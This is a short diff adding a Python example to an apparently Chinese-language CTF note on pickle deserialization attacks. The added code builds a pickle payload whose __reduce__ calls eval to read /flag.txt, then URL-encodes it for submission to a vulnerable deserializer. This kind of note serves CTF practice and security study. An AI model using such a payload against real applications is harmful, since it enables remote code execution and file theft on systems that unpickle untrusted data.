@@ -95,6 +95,19 @@ pickle.load() #对象反序列化，从文件中读取数据
 
 
 ctf中大多数常见的pickle反序列化，利用方法大都是`__reduce__`，实现RCE。
+```
+import pickle
+import urllib
+
+class payload(object):
+    def __reduce__(self):
+       return (eval, ("open('/flag.txt','r').read()",))
+
+a = pickle.dumps(payload())
+a = urllib.quote(a)
+print(a) 
+# 将生成的序列化串，传入反序列化进行RCE文件读取。
+```
 
 
 
